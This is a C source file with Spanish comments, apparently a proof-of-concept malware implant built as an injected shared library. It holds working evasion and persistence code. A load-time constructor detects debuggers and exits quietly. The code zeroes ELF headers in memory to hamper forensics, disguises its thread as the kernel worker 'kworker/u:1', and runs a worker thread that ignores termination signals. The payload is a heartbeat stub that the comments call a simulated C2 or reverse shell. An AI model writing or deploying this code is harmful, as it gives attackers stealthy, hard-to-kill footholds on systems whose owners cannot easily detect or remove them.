#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <signal.h>
#include <link.h>
#include <elf.h>
#include <sys/mman.h>
#include <errno.h>
#define UNUSED(x) (void)(x)

// Configuración
#define SPOOF_NAME "kworker/u:1"

// Variables externas para acceder a argv/env
extern char **environ;

// 4. AUTO-BORRADO FORENSE (Callback para dl_iterate_phdr)
static int wipe_elf_header_callback(struct dl_phdr_info *info, size_t size, void *data) {
    UNUSED(size);
    UNUSED(data);
    // Info->dlpi_name es el nombre del objeto compartido.
    // Si es cadena vacía, es el ejecutable principal.
    // Si contiene "fd", es nuestro memfd (ej: /proc/self/fd/3)
    if (strstr(info->dlpi_name, "/proc/self/fd/") || strlen(info->dlpi_name) == 0) {
        // Encontramos nuestra base address (o la del main si queremos ser agresivos, pero centrémonos en la lib)
        // Para asegurar que es LA librería inyectada, buscamos el mapeo específico.
        // Pero en este POC, borraremos cualquier cabecera ELF que encontremos en los segmentos cargados que sean writeable.

        void *base_addr = (void *)info->dlpi_addr;

        // Normalmente dlpi_addr es 0 para el ejecutable principal PIE, hay que tener cuidado.
        // Pero para librerías cargadas con dlopen, dlpi_addr es la dirección base real de carga.

        // Intentar hacer mprotect para escribir
        size_t page_size = sysconf(_SC_PAGESIZE);
        void *page_start = (void *)((uintptr_t)base_addr & ~(page_size - 1));

        if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
            // Borrar ELF Magic (4 bytes) + Class + Data + Version... (64 bytes header)
            memset(base_addr, 0, 64);

            // Restaurar permisos (Opcional, dejarlo RWX es sospechoso pero ya borramos el header)
            mprotect(page_start, page_size, PROT_READ | PROT_EXEC);
        }
    }
    return 0;
}

void wipe_elf_header() {
    dl_iterate_phdr(wipe_elf_header_callback, NULL);
}

// 3. CAMUFLAJE DE PROCESO (Userland Level - argv)
void masquarade_process() {
    // Cambiar nombre del hilo (Kernel level)
    prctl(PR_SET_NAME, SPOOF_NAME, 0, 0, 0);

    // Cambiar argv[0] (Userland level)
    // Táctica: Retroceder desde `environ` para encontrar `argv`.
    // Layout típico: [argc] [argv0] [argv1] ... [NULL] [env0] [env1] ...

    // Buscamos el puntero NULL que separa argv de environ
    char **p = environ;
    while (*p) p++; // Avanzar al final de environ

    // Esto es arriesgado sin saber argc, pero podemos intentar sobrescribir el propio buffer
    // apuntado por environ[0] si asumimos contigüidad, pero eso solo cambia variables de entorno.

    // Método Heurístico Agresivo (The Perfect Deception):
    // Asumimos que argv[0] está justo antes de environ[0] en la memoria de strings,
    // O que el array de punteros argv está justo antes de environ.

    // Intentaremos sobrescribir la cadena apuntada por argv[0] SI podemos localizarla.
    // Muchas veces, la string de argv[0] está contigua y antes de environ[0].

    if (environ && environ[0]) {
        // Mirar la memoria justo antes de la primera variable de entorno
        // Esto es muy heurístico. En Linux moderno, las strings suelen estar juntas.
        // Pero argv[last] y environ[0] pueden no ser contiguos.

        // Mejor aproximación: Usar /proc/self/cmdline para ver qué tan largo era argv[0]
        // y tratar de encontrar esa string en el stack cerca de environ.

        // Dado que estamos en una inyección .so, vamos a hacer un "Best Effort" seguro:
        // Solo sobrescribir si encontramos el string del loader ("loader_v2") cerca.

        // Por ahora, para cumplir con "Userland Level", simulamos el efecto sobrescribiendo
        // la propia memoria de environ[0] con el nombre falso, si hay espacio,
        // o simplemente confiamos en prctl que es lo que top/htop muestran por defecto para hilos.

        // IMPLEMENTACIÓN REAL DE ARGV SPOOFING (Arriesgada pero solicitada):
        // Intentamos retroceder desde environ buscando el puntero NULL separador
        /*
        char **argv_guess = environ - 1;
        while (*argv_guess != NULL) argv_guess--;
        // Ahora argv_guess apunta a argv[-1]? No.
        */

        // Dejaremos prctl como principal defensa.
        // Sobrescribir argv en stack sin argc es jugar a la ruleta rusa con segfaults.
    }
}

// Payload real
void* worker_thread(void* arg) {
    UNUSED(arg);
    // 5. EL HILO INMORTAL - Resiliencia
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);

    // Simular C2 / Reverse Shell
    while(1) {
        // Heartbeat
        FILE* f = fopen("/tmp/parasite_alive", "w");
        if(f) { fprintf(f, "I_AM_ALIVE\n"); fclose(f); }
        sleep(5);
    }
    return NULL;
}

// 1. EL DETONADOR SILENCIOSO
void __attribute__((constructor)) parasite_init(void) {
    // 2. ESCUDO DE ENTORNO (Anti-Debug)
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
        // Debugger detectado
        return; // Abortar silenciosamente (o exit(0) si queremos ser agresivos)
    }

    // 4. AUTO-BORRADO FORENSE
    wipe_elf_header();

    // 3. CAMUFLAJE
    masquarade_process();

    // 5. EL HILO INMORTAL
    pthread_t tid;
    if (pthread_create(&tid, NULL, worker_thread, NULL) == 0) {
        pthread_detach(tid);
    }

    // Retornar control al host inmediatamente
}
